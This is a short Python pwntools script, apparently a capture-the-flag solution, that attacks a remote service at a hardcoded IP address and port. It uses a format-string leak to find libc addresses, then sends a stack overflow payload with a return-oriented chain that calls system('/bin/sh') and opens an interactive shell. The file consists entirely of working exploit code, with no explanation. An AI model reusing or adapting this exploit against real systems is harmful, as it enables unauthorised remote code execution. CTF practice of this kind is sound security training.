# coding: utf-8 
from pwn import *

context.log_level = 'debug'

conn = remote("114.116.54.89", "10005")

conn.recvuntil('人类的本质是什么?\n')
conn.sendline("%11$p.")
print conn.recvline()

libc_start_main_addr = int(conn.recvline()[2:-2],16)
libc_base  = libc_start_main_addr - 0x20830
sys_addr = libc_base + 0x45390
bin_sh = libc_base + 0x18cd57
ret_rdi = 0x0000000000400933

conn.recvuntil("人类还有什么本质?\n")

payload = "鸽子真香"
payload = payload.ljust(0x20,'a')
payload += 'b' * 8 + p64(ret_rdi) +  p64(bin_sh) + p64(sys_addr)
conn.sendline(payload)

conn.interactive()